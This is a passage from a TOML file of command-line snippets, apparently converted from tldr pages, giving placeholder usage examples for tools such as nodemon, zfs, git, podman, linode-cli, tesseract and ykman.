  description = "Manually restart nodemon (note nodemon must already be active for this to work)"
  command = "rs"
  output = ""

[[snippets]]
  description = "Ignore specific files"
  command = "nodemon --ignore <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Pass arguments to the node application"
  command = "nodemon <path/to/file.js> <arguments>"
  output = ""

[[snippets]]
  description = "Pass arguments to node itself if they're not nodemon arguments already (e.g. `--inspect`)"
  command = "nodemon <arguments> <path/to/file.js>"
  output = ""

[[snippets]]
  description = "Run an arbitrary non-node script"
  command = "nodemon --exec ""<command_to_run_script> <options>"" <path/to/script>"
  output = ""

[[snippets]]
  description = "Run a Python script"
  command = "nodemon --exec ""python <options>"" <path/to/file.py>"
  output = ""

[[snippets]]
  description = "Start an interactive search for a city and fetch data for it"
  command = "peludna-prognoza"
  output = ""

[[snippets]]
  description = "Fetch data for a city"
  command = "peludna-prognoza ""<city>"""
  output = ""

[[snippets]]
  description = "Display data in a machine-readable format"
  command = "peludna-prognoza ""<city>"" --<json|xml>"
  output = ""

[[snippets]]
  description = "Display the pollen measurement page for a city at <https://plivazdravlje.hr> in the default web browser"
  command = "peludna-prognoza ""<city>"" --web"
  output = ""

[[snippets]]
  description = "Encode a file"
  command = "base32 <path/to/file>"
  output = ""

[[snippets]]
  description = "Decode a file"
  command = "base32 --decode <path/to/file>"
  output = ""

[[snippets]]
  description = "Encode from `stdin`"
  command = "<somecommand> | base32"
  output = ""

[[snippets]]
  description = "Decode from `stdin`"
  command = "<somecommand> | base32 --decode"
  output = ""

[[snippets]]
  description = "Compare two files, uncompressing them if necessary"
  command = "zdiff <path/to/file1.gz> <path/to/file2.gz>"
  output = ""

[[snippets]]
  description = "Compare a file to a `gzip` archive with the same name"
  command = "zdiff <path/to/file>"
  output = ""

[[snippets]]
  description = "Execute a Mercurial command"
  command = "hg <command>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "hg help"
  output = ""

[[snippets]]
  description = "Display help for a specific command"
  command = "hg help <command>"
  output = ""

[[snippets]]
  description = "Check the Mercurial version"
  command = "hg --version"
  output = ""

[[snippets]]
  description = "Display the changes that would be performed without performing them (dry-run)"
  command = "2to3 <path/to/file.py>"
  output = ""

[[snippets]]
  description = "Convert a Python 2 file to Python 3"
  command = "2to3 --write <path/to/file.py>"
  output = ""

[[snippets]]
  description = "Convert specific Python 2 language features to Python 3"
  command = "2to3 --write <path/to/file.py> --fix=<raw_input> --fix=<print>"
  output = ""

[[snippets]]
  description = "Convert all Python 2 language features except the specified ones to Python 3"
  command = "2to3 --write <path/to/file.py> --nofix=<has_key> --nofix=<isinstance>"
  output = ""

[[snippets]]
  description = "List all available language features that can be converted from Python 2 to Python 3"
  command = "2to3 --list-fixes"
  output = ""

[[snippets]]
  description = "Convert all Python 2 files in a directory to Python 3"
  command = "2to3 --output-dir=<path/to/python3_directory> --write-unchanged-files --nobackups <path/to/python2_directory>"
  output = ""

[[snippets]]
  description = "Run 2to3 with multiple threads"
  command = "2to3 --processes=<4> --output-dir=<path/to/python3_directory> --write --nobackups --no-diff <path/to/python2_directory>"
  output = ""

[[snippets]]
  description = "Calculate the MD5 checksum for one or more files"
  command = "md5sum <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Calculate and save the list of MD5 checksums to a file"
  command = "md5sum <path/to/file1 path/to/file2 ...> > <path/to/file.md5>"
  output = ""

[[snippets]]
  description = "Calculate an MD5 checksum from `stdin`"
  command = "<command> | md5sum"
  output = ""

[[snippets]]
  description = "Read a file of MD5 sums and filenames and verify all files have matching checksums"
  command = "md5sum --check <path/to/file.md5>"
  output = ""

[[snippets]]
  description = "Only show a message for missing files or when verification fails"
  command = "md5sum --check --quiet <path/to/file.md5>"
  output = ""

[[snippets]]
  description = "Only show a message when verification fails, ignoring missing files"
  command = "md5sum --ignore-missing --check --quiet <path/to/file.md5>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr zstd"
  output = ""

[[snippets]]
  description = "List all available zfs filesystems"
  command = "zfs list"
  output = ""

[[snippets]]
  description = "Create a new ZFS filesystem"
  command = "zfs create <pool_name/filesystem_name>"
  output = ""

[[snippets]]
  description = "Delete a ZFS filesystem"
  command = "zfs destroy <pool_name/filesystem_name>"
  output = ""

[[snippets]]
  description = "Create a Snapshot of a ZFS filesystem"
  command = "zfs snapshot <pool_name/filesystem_name>@<snapshot_name>"
  output = ""

[[snippets]]
  description = "Enable compression on a filesystem"
  command = "zfs set compression=on <pool_name/filesystem_name>"
  output = ""

[[snippets]]
  description = "Change mountpoint for a filesystem"
  command = "zfs set mountpoint=</my/mount/path> <pool_name/filesystem_name>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr helix"
  output = ""

[[snippets]]
  description = "Make a new draft"
  command = "zm new"
  output = ""

[[snippets]]
  description = "Edit a draft"
  command = "zm edit"
  output = ""

[[snippets]]
  description = "Publish a draft and commit it with git"
  command = "zm publish"
  output = ""

[[snippets]]
  description = "Set a size of 10 GB to an existing file, or create a new file with the specified size"
  command = "truncate --size <10G> <filename>"
  output = ""

[[snippets]]
  description = "Extend the file size by 50 MiB, fill with holes (which reads as zero bytes)"
  command = "truncate --size +<50M> <filename>"
  output = ""

[[snippets]]
  description = "Shrink the file by 2 GiB, by removing data from the end of file"
  command = "truncate --size -<2G> <filename>"
  output = ""

[[snippets]]
  description = "Empty the file's content"
  command = "truncate --size 0 <filename>"
  output = ""

[[snippets]]
  description = "Empty the file's content, but do not create the file if it does not exist"
  command = "truncate --no-create --size 0 <filename>"
  output = ""

[[snippets]]
  description = "Decompose one or more graphs into their biconnected components"
  command = "bcomps <path/to/input1.gv> <path/to/input2.gv ...> > <path/to/output.gv>"
  output = ""

[[snippets]]
  description = "Print the number of blocks and cutvertices in one or more graphs"
  command = "bcomps -v -s <path/to/input1.gv> <path/to/input2.gv ...>"
  output = ""

[[snippets]]
  description = "Write each block and block-cutvertex tree to multiple numbered filenames based on `output.gv`"
  command = "bcomps -x -o <path/to/output.gv> <path/to/input1.gv path/to/input2.gv ...>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "bcomps -?"
  output = ""

[[snippets]]
  description = "List all LKE clusters"
  command = "linode-cli lke clusters list"
  output = ""

[[snippets]]
  description = "Create a new LKE cluster"
  command = "linode-cli lke clusters create --region <region> --type <type> --node-type <node_type> --nodes-count <count>"
  output = ""

[[snippets]]
  description = "View details of a specific LKE cluster"
  command = "linode-cli lke clusters view <cluster_id>"
  output = ""

[[snippets]]
  description = "Update an existing LKE cluster"
  command = "linode-cli lke clusters update <cluster_id> --node-type <new_node_type>"
  output = ""

[[snippets]]
  description = "Delete an LKE cluster"
  command = "linode-cli lke clusters delete <cluster_id>"
  output = ""

[[snippets]]
  description = "List all managed domains"
  command = "linode-cli domains list"
  output = ""

[[snippets]]
  description = "Create a new managed domain"
  command = "linode-cli domains create --domain <domain_name> --type <master|slave> --soa-email <email>"
  output = ""

[[snippets]]
  description = "View details of a specific domain"
  command = "linode-cli domains view <domain_id>"
  output = ""

[[snippets]]
  description = "Delete a managed domain"
  command = "linode-cli domains delete <domain_id>"
  output = ""

[[snippets]]
  description = "List records for a specific domain"
  command = "linode-cli domains records-list <domain_id>"
  output = ""

[[snippets]]
  description = "Add a DNS record to a domain"
  command = "linode-cli domains records-create <domain_id> --type <A|AAAA|CNAME|MX|...> --name <subdomain> --target <target_value>"
  output = ""

[[snippets]]
  description = "Update a DNS record for a domain"
  command = "linode-cli domains records-update <domain_id> <record_id> --target <new_target_value>"
  output = ""

[[snippets]]
  description = "Delete a DNS record from a domain"
  command = "linode-cli domains records-delete <domain_id> <record_id>"
  output = ""

[[snippets]]
  description = "Add a table to the list of staged tables (stage a table)"
  command = "dolt add <table>"
  output = ""

[[snippets]]
  description = "Stage all tables"
  command = "dolt add --all"
  output = ""

[[snippets]]
  description = "Apply changes from the patch file to the original file"
  command = "wiggle <path/to/my_patch.patch>"
  output = ""

[[snippets]]
  description = "Apply changes to the [o]utput file"
  command = "wiggle <path/to/my_patch.patch> -o <path/to/output_file.txt>"
  output = ""

[[snippets]]
  description = "Take any changes in `file.rej` that could not have been applied and merge them into a file"
  command = "wiggle --replace <path/to/file> <path/to/file.rej>"
  output = ""

[[snippets]]
  description = "E[x]tract one branch of a patch or merge file"
  command = "wiggle -x <path/to/my_patch.patch>"
  output = ""

[[snippets]]
  description = "Apply a patch and save the compared words to the [o]utput file"
  command = "wiggle --words <path/to/my_word_patch.patch> -o <path/to/word_patched_code.c>"
  output = ""

[[snippets]]
  description = "Display help about the merge function"
  command = "wiggle --merge --help"
  output = ""

[[snippets]]
  description = "Search for a pattern within a compressed file"
  command = "bzgrep ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Use extended regular expressions (supports `?`, `+`, `{}`, `()` and `|`), in case-insensitive mode"
  command = "bzgrep --extended-regexp --ignore-case ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Print 3 lines of context around, before, or after each match"
  command = "bzgrep --<context|before-context|after-context>=<3> ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Print file name and line number for each match"
  command = "bzgrep --with-filename --line-number ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Search for lines matching a pattern, printing only the matched text"
  command = "bzgrep --only-matching ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Recursively search files in a `bzip2` compressed `tar` archive for a pattern"
  command = "bzgrep --recursive ""<search_pattern>"" <path/to/tar/file>"
  output = ""

[[snippets]]
  description = "Search `stdin` for lines that do not match a pattern"
  command = "cat </path/to/bz/compressed/file> | bzgrep --invert-match ""<search_pattern>"""
  output = ""

[[snippets]]
  description = "Delete files that are not tracked by Git"
  command = "git clean"
  output = ""

[[snippets]]
  description = "Interactively delete files that are not tracked by Git"
  command = "git clean -i"
  output = ""

[[snippets]]
  description = "Show what files would be deleted without actually deleting them"
  command = "git clean --dry-run"
  output = ""

[[snippets]]
  description = "Forcefully delete files that are not tracked by Git"
  command = "git clean -f"
  output = ""

[[snippets]]
  description = "Forcefully delete directories that are not tracked by Git"
  command = "git clean -fd"
  output = ""

[[snippets]]
  description = "Delete untracked files, including ignored files in `.gitignore` and `.git/info/exclude`"
  command = "git clean -x"
  output = ""

[[snippets]]
  description = "Create an image using a `Dockerfile` or `Containerfile` in the specified directory"
  command = "podman build <path/to/directory>"
  output = ""

[[snippets]]
  description = "Create an image with a specified tag"
  command = "podman build --tag <image_name:version> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Create an image from a non-standard file"
  command = "podman build --file <Containerfile.different> ."
  output = ""

[[snippets]]
  description = "Create an image without using any previously cached images"
  command = "podman build --no-cache <path/to/directory>"
  output = ""

[[snippets]]
  description = "Create an image suppressing all output"
  command = "podman build --quiet <path/to/directory>"
  output = ""

[[snippets]]
  description = "List installed libraries"
  command = "pio lib list"
  output = ""

[[snippets]]
  description = "List built-in libraries based on installed development platforms and their frameworks"
  command = "pio lib builtin"
  output = ""

[[snippets]]
  description = "Search for existing libraries"
  command = "pio lib search <keyword>"
  output = ""

[[snippets]]
  description = "Show details about a library"
  command = "pio lib show <library>"
  output = ""

[[snippets]]
  description = "Install a library"
  command = "pio lib install <library>"
  output = ""

[[snippets]]
  description = "Update installed libraries"
  command = "pio lib update"
  output = ""

[[snippets]]
  description = "Uninstall a library"
  command = "pio lib uninstall <library>"
  output = ""

[[snippets]]
  description = "Show PlatformIO library registry statistics"
  command = "pio lib stats"
  output = ""

[[snippets]]
  description = "Convert an XBM image to a PPM image"
  command = "xbmtopbm <path/to/input_file.xbm> > <path/to/output_file.pbm>"
  output = ""

[[snippets]]
  description = "Check whether a file or directory is ignored"
  command = "git check-ignore <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Check whether multiple files or directories are ignored"
  command = "git check-ignore <path/to/file_or_directory1 path/to/file_or_directory2 ...>"
  output = ""

[[snippets]]
  description = "Use pathnames, one per line, from `stdin`"
  command = "git check-ignore --stdin < <path/to/file_list>"
  output = ""

[[snippets]]
  description = "Do not check the index (used to debug why paths were tracked and not ignored)"
  command = "git check-ignore --no-index <path/to/file_or_directory1 path/to/file_or_directory2 ...>"
  output = ""

[[snippets]]
  description = "Include details about the matching pattern for each path"
  command = "git check-ignore --verbose <path/to/file_or_directory1 path/to/file_or_directory2 ...>"
  output = ""

[[snippets]]
  description = "Run a subshell asynchronously"
  command = "coproc { <command1; command2; ...>; }"
  output = ""

[[snippets]]
  description = "Create a coprocess with a specific name"
  command = "coproc <name> { <command1; command2; ...>; }"
  output = ""

[[snippets]]
  description = "Write to a specific coprocess `stdin`"
  command = "echo ""<input>"" >&""$<{name>[1]}"""
  output = ""

[[snippets]]
  description = "Read from a specific coprocess `stdout`"
  command = "read <variable> <&""$<{name>[0]}"""
  output = ""

[[snippets]]
  description = "Create a coprocess which repeatedly reads `stdin` and runs some commands on the input"
  command = "coproc <name> { while read line; do <command1; command2; ...>; done }"
  output = ""

[[snippets]]
  description = "Create and use a coprocess running `bc`"
  command = "coproc BC { bc --mathlib; }; echo ""1/3"" >&""${BC[1]}""; read output <&""${BC[0]}""; echo ""$output"""
  output = ""

[[snippets]]
  description = "Recognize text in an image and save it to `output.txt` (the `.txt` extension is added automatically)"
  command = "tesseract <image.png> <output>"
  output = ""

[[snippets]]
  description = "Specify a custom language (default is English) with an ISO 639-2 code (e.g. deu = Deutsch = German)"
  command = "tesseract -l deu <image.png> <output>"
  output = ""

[[snippets]]
  description = "List the ISO 639-2 codes of available languages"
  command = "tesseract --list-langs"
  output = ""

[[snippets]]
  description = "Specify a custom page segmentation mode (default is 3)"
  command = "tesseract -psm <0_to_10> <image.png> <output>"
  output = ""

[[snippets]]
  description = "List page segmentation modes and their descriptions"
  command = "tesseract --help-psm"
  output = ""

[[snippets]]
  description = "Install a package"
  command = "pip3 install <package>"
  output = ""

[[snippets]]
  description = "Install a specific version of a package"
  command = "pip3 install <package>==<version>"
  output = ""

[[snippets]]
  description = "Upgrade a package"
  command = "pip3 install --upgrade <package>"
  output = ""

[[snippets]]
  description = "Uninstall a package"
  command = "pip3 uninstall <package>"
  output = ""

[[snippets]]
  description = "Save the list of installed packages to a file"
  command = "pip3 freeze > <requirements.txt>"
  output = ""

[[snippets]]
  description = "Install packages from a file"
  command = "pip3 install --requirement <requirements.txt>"
  output = ""

[[snippets]]
  description = "Show installed package info"
  command = "pip3 show <package>"
  output = ""

[[snippets]]
  description = "Compress a WebP file with default settings (q = 75) to the [o]utput file"
  command = "cwebp <path/to/image_file> -o <path/to/output.webp>"
  output = ""

[[snippets]]
  description = "Compress a WebP file with the best [q]uality and largest file size"
  command = "cwebp <path/to/image_file> -o <path/to/output.webp> -q <100>"
  output = ""

[[snippets]]
  description = "Compress a WebP file with the worst [q]uality and smallest file size"
  command = "cwebp <path/to/image_file> -o <path/to/output.webp> -q <0>"
  output = ""

[[snippets]]
  description = "Compress a WebP file and apply resize to image"
  command = "cwebp <path/to/image_file> -o <path/to/output.webp> -resize <width> <height>"
  output = ""

[[snippets]]
  description = "Compress a WebP file and drop alpha channel information"
  command = "cwebp <path/to/image_file> -o <path/to/output.webp> -noalpha"
  output = ""

[[snippets]]
  description = "Output the content of `warts` files verbose"
  command = "sc_wartsdump <path/to/file1.warts path/to/file2.warts ...>"
  output = ""

[[snippets]]
  description = "Initialize an Elm project, generates an elm.json file"
  command = "elm init"
  output = ""

[[snippets]]
  description = "Start interactive Elm shell"
  command = "elm repl"
  output = ""

[[snippets]]
  description = "Compile an Elm file, output the result to an `index.html` file"
  command = "elm make <source>"
  output = ""

[[snippets]]
  description = "Compile an Elm file, output the result to a JavaScript file"
  command = "elm make <source> --output=<destination>.js"
  output = ""

[[snippets]]
  description = "Start local web server that compiles Elm files on page load"
  command = "elm reactor"
  output = ""

[[snippets]]
  description = "Install Elm package from <https://package.elm-lang.org>"
  command = "elm install <author>/<package>"
  output = ""

[[snippets]]
  description = "Generate all possible strings that match a regular expression"
  command = "exrex '<regular_expression>'"
  output = ""

[[snippets]]
  description = "Generate a random string that matches a regular expression"
  command = "exrex --random '<regular_expression>'"
  output = ""

[[snippets]]
  description = "Generate at most 100 strings that match a regular expression"
  command = "exrex --max-number <100> '<regular_expression>'"
  output = ""

[[snippets]]
  description = "Generate all possible strings that match a regular expression, joined by a custom delimiter string"
  command = "exrex --delimiter ""<, >"" '<regular_expression>'"
  output = ""

[[snippets]]
  description = "Print count of all possible strings that match a regular expression"
  command = "exrex --count '<regular_expression>'"
  output = ""

[[snippets]]
  description = "Simplify a regular expression"
  command = "exrex --simplify '<ab|ac>'"
  output = ""

[[snippets]]
  description = "Print eyes"
  command = "exrex '<[oO0](_)[oO0]>'"
  output = ""

[[snippets]]
  description = "Print a boat"
  command = "exrex '<( {20}(\| *\\|-{22}|\|)|\.={50}| ( ){0,5}\\\.| {12}~{39})>'"
  output = ""

[[snippets]]
  description = "List the instances in the specified state belonging to the specified compartment"
  command = "VBoxManage cloud --provider=<provider_name> --profile=<profile_name> list instances --state=<running|terminated|paused> --compartment-id=<compartment_id}"
  output = ""

[[snippets]]
  description = "Create a new instance"
  command = "VBoxManage cloud --provider=<provider_name> --profile=<profile_name> instance create --domain-name=<domain_name> --image-id=<image_id> | <--options...>"
  output = ""

[[snippets]]
  description = "Gather information about a particular instance"
  command = "VBoxManage cloud --provider=<provider_name> --profile=<profile_name> instance info --id=<unique_id>"
  output = ""

[[snippets]]
  description = "Terminate an instance"
  command = "VBoxManage cloud --provider=<provider_name> --profile=<profile_name> instance terminate --id=<unique_id>"
  output = ""

[[snippets]]
  description = "List images within a specific compartment and state"
  command = "VBoxManage cloud --provider=<provider_name> --profile=<profile_name> list images --compartment-id=<compartment_id> --state=<state_name>"
  output = ""

[[snippets]]
  description = "Create a new image"
  command = "VBoxManage cloud --provider=<provider_name> --profile=<profile_name> image create --instance-id=<instance_id> --display-name=<display_name> --compartment-id=<compartmet_id>"
  output = ""

[[snippets]]
  description = "Retrieve information about a particular image"
  command = "VBoxManage cloud --provider=<provider_name> --profile=<profile_name> image info --id=<unique_id>"
  output = ""

[[snippets]]
  description = "Delete an image"
  command = "VBoxManage cloud --provider=<provider_name> --profile=<profile_name> image delete --id=<unique_id>"
  output = ""

[[snippets]]
  description = "Open the homepage of the current repository in the default web browser"
  command = "gh browse"
  output = ""

[[snippets]]
  description = "Open the homepage of a specific repository in the default web browser"
  command = "gh browse <owner>/<repository>"
  output = ""

[[snippets]]
  description = "Open the settings page of the current repository in the default web browser"
  command = "gh browse --settings"
  output = ""

[[snippets]]
  description = "Open the wiki of the current repository in the default web browser"
  command = "gh browse --wiki"
  output = ""

[[snippets]]
  description = "Open a specific issue or pull request in the web browser"
  command = "gh browse <issue_number|pull_request_number>"
  output = ""

[[snippets]]
  description = "Open a specific branch in the web browser"
  command = "gh browse --branch <branch_name>"
  output = ""

[[snippets]]
  description = "Open a specific file or directory of the current repository in the web browser"
  command = "gh browse <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Print the destination URL without open the web browser"
  command = "gh browse --no-browser"
  output = ""

[[snippets]]
  description = "Open PlatformIO Home in the default web browser"
  command = "pio home"
  output = ""

[[snippets]]
  description = "Use a specific HTTP port (defaults to 8008)"
  command = "pio home --port <port>"
  output = ""

[[snippets]]
  description = "Bind to a specific IP address (defaults to 127.0.0.1)"
  command = "pio home --host <ip_address>"
  output = ""

[[snippets]]
  description = "Do not automatically open PlatformIO Home in the default web browser"
  command = "pio home --no-open"
  output = ""

[[snippets]]
  description = "Automatically shutdown the server on timeout (in seconds) when no clients are connected"
  command = "pio home --shutdown-timeout <time>"
  output = ""

[[snippets]]
  description = "Specify a unique session identifier to keep PlatformIO Home isolated from other instances and protected from 3rd party access"
  command = "pio home --session-id <id>"
  output = ""

[[snippets]]
  description = "Convert a specific `.adoc` file to HTML (the default output format)"
  command = "asciidoctor <path/to/file.adoc>"
  output = ""

[[snippets]]
  description = "Convert a specific `.adoc` file to HTML and link a CSS stylesheet"
  command = "asciidoctor -a stylesheet=<path/to/stylesheet.css> <path/to/file.adoc>"
  output = ""

[[snippets]]
  description = "Convert a specific `.adoc` file to embeddable HTML, removing everything except the body"
  command = "asciidoctor --embedded <path/to/file.adoc>"
  output = ""

[[snippets]]
  description = "Convert a specific `.adoc` file to a PDF using the `asciidoctor-pdf` library"
  command = "asciidoctor --backend=<pdf> --require=<asciidoctor-pdf> <path/to/file.adoc>"
  output = ""

[[snippets]]
  description = "Execute a TypeScript file without compiling (`node` + `tsc`)"
  command = "ts-node <path/to/file.ts>"
  output = ""

[[snippets]]
  description = "Execute a TypeScript file without loading `tsconfig.json`"
  command = "ts-node --skip-project <path/to/file.ts>"
  output = ""

[[snippets]]
  description = "Evaluate TypeScript code passed as a literal"
  command = "ts-node --eval '<console.log(""Hello World"")>'"
  output = ""

[[snippets]]
  description = "Execute a TypeScript file in script mode"
  command = "ts-node --script-mode <path/to/file.ts>"
  output = ""

[[snippets]]
  description = "Transpile a TypeScript file to JavaScript without executing it"
  command = "ts-node --transpile-only <path/to/file.ts>"
  output = ""

[[snippets]]
  description = "Display TS-Node help"
  command = "ts-node --help"
  output = ""

[[snippets]]
  description = "Convert `warts` files to JSON and output the result"
  command = "sc_warts2json <path/to/file1.warts path/to/file2.warts ...>"
  output = ""

[[snippets]]
  description = "Download a specific Docker image"
  command = "docker pull <image>:<tag>"
  output = ""

[[snippets]]
  description = "Download a specific Docker image in quiet mode"
  command = "docker pull --quiet <image>:<tag>"
  output = ""

[[snippets]]
  description = "Download all tags of a specific Docker image"
  command = "docker pull --all-tags <image>"
  output = ""

[[snippets]]
  description = "Download a Docker images for a specific platform, e.g. linux/amd64"
  command = "docker pull --platform <linux/amd64> <image>:<tag>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "docker pull --help"
  output = ""

[[snippets]]
  description = "Retrieve information about the current server"
  command = "hsd-cli info"
  output = ""

[[snippets]]
  description = "Broadcast a local transaction"
  command = "hsd-cli broadcast <transaction_hex>"
  output = ""

[[snippets]]
  description = "Retrieve a mempool snapshot"
  command = "hsd-cli mempool"
  output = ""

[[snippets]]
  description = "View a transaction by address or hash"
  command = "hsd-cli tx <address_or_hash>"
  output = ""

[[snippets]]
  description = "View a coin by its hash index or address"
  command = "hsd-cli coin <hash_index_or_address>"
  output = ""

[[snippets]]
  description = "View a block by height or hash"
  command = "hsd-cli block <height_or_hash>"
  output = ""

[[snippets]]
  description = "Reset the chain to the specified block"
  command = "hsd-cli reset <height_or_hash>"
  output = ""

[[snippets]]
  description = "Execute an RPC command"
  command = "hsd-cli rpc <command> <args>"
  output = ""

[[snippets]]
  description = "Execute the given commands for each of the specified items"
  command = "for <variable> in <item1 item2 ...>; do <echo ""Loop is executed"">; done"
  output = ""

[[snippets]]
  description = "Iterate over a given range of numbers"
  command = "for <variable> in <{from>..<to>..<step>}; do <echo ""Loop is executed"">; done"
  output = ""

[[snippets]]
  description = "Iterate over a given list of files"
  command = "for <variable> in <path/to/file1 path/to/file2 ...>; do <echo ""Loop is executed"">; done"
  output = ""

[[snippets]]
  description = "Iterate over a given list of directories"
  command = "for <variable> in <path/to/directory1/ path/to/directory2/ ...>; do <echo ""Loop is executed"">; done"
  output = ""

[[snippets]]
  description = "Perform a given command in every directory"
  command = "for <variable> in */; do (cd ""$<variable>"" || continue; <echo ""Loop is executed"">) done"
  output = ""

[[snippets]]
  description = "Render a `png` image with a filename based on the input filename and output format (uppercase -O)"
  command = "patchwork -T <png> -O <path/to/input.gv>"
  output = ""

[[snippets]]
  description = "Render a `svg` image with the specified output filename (lowercase -o)"
  command = "patchwork -T <svg> -o <path/to/image.svg> <path/to/input.gv>"
  output = ""

[[snippets]]
  description = "Render the output in `ps`, `pdf`, `svg`, `fig`, `png`, `gif`, `jpg`, `json`, or `dot` format"
  command = "patchwork -T <format> -O <path/to/input.gv>"
  output = ""

[[snippets]]
  description = "Render a `gif` image using `stdin` and `stdout`"
  command = "echo ""<digraph {this -> that} >"" | patchwork -T <gif> > <path/to/image.gif>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "patchwork -?"
  output = ""

[[snippets]]
  description = "Capture packets and display information about a wireless network"
  command = "sudo airodump-ng <interface>"
  output = ""

[[snippets]]
  description = "Capture packets and display information about a wireless network given the MAC address and channel, and save the output to a file"
  command = "sudo airodump-ng --channel <channel> --write <path/to/file> --bssid <mac> <interface>"
  output = ""

[[snippets]]
  description = "Display general information about the OATH application"
  command = "ykman oath info"
  output = ""

[[snippets]]
  description = "Change the password used to protect OATH accounts (add `--clear` to remove it)"
  command = "ykman oath access change"
  output = ""

[[snippets]]
  description = "Add a new account (`--issuer` is optional)"
  command = "ykman oath accounts add --issuer <issuer> <name>"
  output = ""

[[snippets]]
  description = "List all accounts (with their issuers)"
  command = "ykman oath accounts list"
  output = ""

[[snippets]]
  description = "List all accounts with their current TOTP/HOTP codes (optionally filtering the list with a keyword)"
  command = "ykman oath accounts code <keyword>"
  output = ""

[[snippets]]
  description = "Rename an account"
  command = "ykman oath accounts rename <keyword> <issuer:name|name>"
  output = ""

[[snippets]]
  description = "Delete an account"
  command = "ykman oath accounts delete <keyword>"
  output = ""

[[snippets]]
  description = "Delete all accounts and restore factory settings"
  command = "ykman oath reset"
  output = ""

[[snippets]]
  description = "Copy a file to another location"
  command = "cp <path/to/source_file.ext> <path/to/target_file.ext>"
  output = ""

[[snippets]]
  description = "Copy a file into another directory, keeping the filename"
  command = "cp <path/to/source_file.ext> <path/to/target_parent_directory>"
  output = ""

[[snippets]]
  description = "Recursively copy a directory's contents to another location (if the destination exists, the directory is copied inside it)"
  command = "cp -R <path/to/source_directory> <path/to/target_directory>"
  output = ""

[[snippets]]
  description = "Copy a directory recursively, in verbose mode (shows files as they are copied)"
  command = "cp -vR <path/to/source_directory> <path/to/target_directory>"
  output = ""

[[snippets]]
  description = "Copy multiple files at once to a directory"
  command = "cp -t <path/to/destination_directory> <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Copy text files to another location, in interactive mode (prompts user before overwriting)"
  command = "cp -i <*.txt> <path/to/target_directory>"
  output = ""

[[snippets]]
  description = "Follow symbolic links before copying"
  command = "cp -L <link> <path/to/target_directory>"
  output = ""

[[snippets]]
  description = "Use the first argument as the destination directory (useful for `xargs ... | cp -t <DEST_DIR>`)"
  command = "cp -t <path/to/target_directory> <path/to/file_or_directory1 path/to/file_or_directory2 ...>"
  output = ""

[[snippets]]
  description = "Compile a package"
  command = "gradle build"
  output = ""

[[snippets]]
  description = "Exclude test task"
  command = "gradle build -x <test>"
  output = ""

[[snippets]]
  description = "Run in offline mode to prevent Gradle from accessing the network during builds"
  command = "gradle build --offline"
  output = ""

[[snippets]]
  description = "Clear the build directory"
  command = "gradle clean"
  output = ""

[[snippets]]
  description = "Build an Android Package (APK) in release mode"
  command = "gradle assembleRelease"
  output = ""

[[snippets]]
  description = "List the main tasks"
  command = "gradle tasks"
  output = ""

[[snippets]]
  description = "List all the tasks"
  command = "gradle tasks --all"
  output = ""

[[snippets]]
  description = "View stories on Hacker News"
  command = "hn"
  output = ""

[[snippets]]
  description = "View _number_ of stories on Hacker News"
  command = "hn --limit <number>"
  output = ""

[[snippets]]
  description = "View stories on Hacker News, and keep the list open after selecting a link"
  command = "hn --keep-open"
  output = ""

[[snippets]]
  description = "View stories on Hacker News sorted by submission date"
  command = "hn --latest"
  output = ""

[[snippets]]
  description = "Pretty-print one or more graphs in canonical format"
  command = "nop <path/to/input1.gv> <path/to/input2.gv ...> > <path/to/output.gv>"
  output = ""

[[snippets]]
  description = "Check one or more graphs for validity, producing no output graph"
  command = "nop -p <path/to/input1.gv> <path/to/input2.gv ...>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "nop -?"
  output = ""

[[snippets]]
  description = "View all RBAC bindings"
  command = "rbac-lookup"
  output = ""

[[snippets]]
  description = "View RBAC bindings that match a given expression"
  command = "rbac-lookup <search_term>"
  output = ""

[[snippets]]
  description = "View all RBAC bindings along with the source role binding"
  command = "rbac-lookup -o wide"
  output = ""

[[snippets]]
  description = "View all RBAC bindings filtered by subject"
  command = "rbac-lookup -k <user|group|serviceaccount>"
  output = ""

[[snippets]]
  description = "View all RBAC bindings along with IAM roles (if you are using GKE)"
  command = "rbac-lookup --gke"
  output = ""

[[snippets]]
  description = "Display a notification when `tar` finishes compressing files"
  command = "noti <tar -cjf example.tar.bz2 example/>"
  output = ""

[[snippets]]
  description = "Display a notification even when you put it after the command to watch"
  command = "<command_to_watch>; noti"
  output = ""

[[snippets]]
  description = "Monitor a process by PID and trigger a notification when the PID disappears"
  command = "noti -w <process_id>"
  output = ""

[[snippets]]
  description = "Check out a specific merge request"
  command = "git mr <mr_number>"
  output = ""

[[snippets]]
  description = "Check out a merge request from a specific remote"
  command = "git mr <mr_number> <remote>"
  output = ""

[[snippets]]
  description = "Checkout a merge request from its URL"
  command = "git mr <url>"
  output = ""

[[snippets]]
  description = "Clean up old merge request branches"
  command = "git mr clean"
  output = ""

[[snippets]]
  description = "Initialize a configuration file"
  command = "envoy init <host_name>"
  output = ""

[[snippets]]
  description = "Run a task"
  command = "envoy run <task_name>"
  output = ""

[[snippets]]
  description = "Run a task from a specific project"
  command = "envoy run --path <path/to/directory> <task_name>"
  output = ""

[[snippets]]
  description = "Run a task and continue on failure"
  command = "envoy run --continue <task_name>"
  output = ""

[[snippets]]
  description = "Dump a task as a Bash script for inspection"
  command = "envoy run --pretend <task_name>"
  output = ""

[[snippets]]
  description = "Connect to the specified server via SSH"
  command = "envoy ssh <server_name>"
  output = ""

[[snippets]]
  description = "Run Python web app"
  command = "uvicorn <import.path:app_object>"
  output = ""

